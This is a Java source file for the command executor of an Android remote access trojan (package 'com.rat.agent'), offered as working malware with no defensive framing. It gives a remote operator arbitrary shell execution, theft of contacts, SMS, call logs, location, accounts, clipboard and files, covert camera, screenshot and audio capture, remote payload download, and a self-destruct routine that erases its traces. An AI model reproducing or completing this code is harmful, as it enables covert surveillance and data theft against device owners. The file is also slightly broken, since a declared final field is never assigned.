package com.rat.agent;

import android.content.Context;

import org.json.JSONObject;
import org.json.JSONArray;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.TimeUnit;

public class CommandExecutor {

    private final Context ctx;
    private final DataCollector collector;
    private final CryptoUtils crypto;

    public CommandExecutor(Context ctx) {
        this.ctx = ctx;
        this.collector = new DataCollector(ctx);
    }

    public JSONObject execute(String cmdId, String command, JSONObject params) {
        JSONObject result = new JSONObject();
        try {
            result.put("cmd_id", cmdId);
            result.put("command", command);
            result.put("status", "ok");

            switch (command.toUpperCase()) {
                case "SHELL":
                    result.put("data", execShell(params.optString("command", "id")));
                    break;
                case "EXFIL_CONTACTS":
                    result.put("data", collector.collectContacts());
                    result.put("data_type", "contacts");
                    break;
                case "EXFIL_SMS":
                    result.put("data", collector.collectSms());
                    result.put("data_type", "sms");
                    break;
                case "EXFIL_CALL_LOG":
                    result.put("data", collector.collectCallLog());
                    result.put("data_type", "call_log");
                    break;
                case "GET_LOCATION":
                    result.put("data", collector.collectLocation());
                    result.put("data_type", "location");
                    break;
                case "GET_DEVICE_INFO":
                    result.put("data", collector.collectDeviceInfo());
                    result.put("data_type", "device_info");
                    break;
                case "LIST_APPS":
                    result.put("data", collector.collectAppList());
                    result.put("data_type", "app_list");
                    break;
                case "SCREENSHOT":
                    result.put("data", collector.captureScreenshot());
                    result.put("data_type", "screenshot");
                    break;
                case "TAKE_PHOTO":
                    result.put("data", collector.capturePhoto());
                    result.put("data_type", "photo");
                    break;
                case "RECORD_AUDIO":
                    int dur = params.optInt("duration", 10);
                    result.put("data", collector.recordAudio(dur));
                    result.put("data_type", "audio");
                    break;
                case "GET_ACCOUNTS":
                    result.put("data", collector.collectAccounts());
                    result.put("data_type", "accounts");
                    break;
                case "GET_WIFI_INFO":
                    result.put("data", collector.collectWifiInfo());
                    result.put("data_type", "wifi");
                    break;
                case "CLIPBOARD":
                    result.put("data", collector.collectClipboard());
                    result.put("data_type", "clipboard");
                    break;
                case "LIST_FILES":
                    result.put("data", collector.collectFiles(params.optString("path", "")));
                    result.put("data_type", "files");
                    break;
                case "FILE_DOWNLOAD":
                    result.put("data", downloadFile(params.optString("remote_path", "")));
                    result.put("data_type", "file_download");
                    break;
                case "FILE_UPLOAD":
                    result.put("data", uploadFile(params.optString("local_path", "")));
                    result.put("data_type", "file_upload");
                    break;
                case "EXFIL_ALL":
                    JSONObject all = new JSONObject();
                    all.put("contacts", new JSONObject(collector.collectContacts()));
                    all.put("sms", new JSONObject(collector.collectSms()));
                    all.put("call_log", new JSONObject(collector.collectCallLog()));
                    all.put("location", new JSONObject(collector.collectLocation()));
                    all.put("device_info", new JSONObject(collector.collectDeviceInfo()));
                    all.put("accounts", new JSONObject(collector.collectAccounts()));
                    all.put("wifi", new JSONObject(collector.collectWifiInfo()));
                    all.put("clipboard", new JSONObject(collector.collectClipboard()));
                    result.put("data", all.toString());
                    result.put("data_type", "all");
                    break;
                case "SELF_DESTRUCT":
                    selfDestruct();
                    result.put("data", "self_destruct_initiated");
                    break;
                case "PING":
                    result.put("data", "pong");
                    break;
                default:
                    result.put("status", "error");
                    result.put("data", "unknown command: " + command);
                    break;
            }
        } catch (Exception e) {
            try {
                result.put("status", "error");
                result.put("data", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }

    private String execShell(String cmd) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", cmd);
        pb.redirectErrorStream(true);
        Process proc = pb.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line).append("\n");
        }
        proc.waitFor(30, TimeUnit.SECONDS);
        return sb.toString();
    }

    private String downloadFile(String remoteUrl) throws Exception {
        File dir = new File(ctx.getCacheDir(), "rat_data");
        dir.mkdirs();
        String filename = "dl_" + System.currentTimeMillis();
        File outFile = new File(dir, filename);
        URL url = new URL(remoteUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(30000);
        conn.connect();
        FileOutputStream fos = new FileOutputStream(outFile);
        byte[] buf = new byte[4096];
        int read;
        while ((read = conn.getInputStream().read(buf)) != -1) {
            fos.write(buf, 0, read);
        }
        fos.close();
        conn.disconnect();
        JSONObject r = new JSONObject();
        r.put("file", outFile.getAbsolutePath());
        r.put("size", outFile.length());
        return r.toString();
    }

    private String uploadFile(String localPath) throws Exception {
        File f = new File(localPath);
        if (!f.exists()) {
            return "{\"error\":\"file not found\"}";
        }
        byte[] fileData = new byte[(int) f.length()];
        FileInputStream fis = new FileInputStream(f);
        fis.read(fileData);
        fis.close();
        JSONObject r = new JSONObject();
        r.put("file", localPath);
        r.put("size", f.length());
        r.put("data_b64", android.util.Base64.encodeToString(fileData, android.util.Base64.NO_WRAP));
        return r.toString();
    }

    private void selfDestruct() {
        try {
            OfflineQueue queue = new OfflineQueue(ctx);
            queue.clearAll();

            File dbFile = ctx.getDatabasePath("rat_queue.db");
            if (dbFile.exists()) dbFile.delete();
            File shmFile = new File(dbFile.getParent(), "rat_queue.db-shm");
            if (shmFile.exists()) shmFile.delete();
            File walFile = new File(dbFile.getParent(), "rat_queue.db-wal");
            if (walFile.exists()) walFile.delete();

            ctx.deleteSharedPreferences("rat_config");

            File dataDir = ctx.getFilesDir();
            deleteRecursive(dataDir);

            android.app.ActivityManager am =
                (android.app.ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                am.killBackgroundProcesses(ctx.getPackageName());
            }
            System.exit(0);
        } catch (Exception ignored) {}
    }

    private void deleteRecursive(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        file.delete();
    }
}
